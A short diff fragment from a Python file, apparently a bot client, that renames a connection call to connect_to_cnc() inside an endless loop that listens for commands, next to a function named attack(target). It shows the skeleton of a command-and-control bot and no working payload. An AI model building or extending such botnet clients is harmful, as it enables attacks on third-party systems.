@@ -33,6 +33,6 @@ def attack(target):
 
 
 while True:
-    sock = connect()
+    sock = connect_to_cnc()
     listen(sock)
 
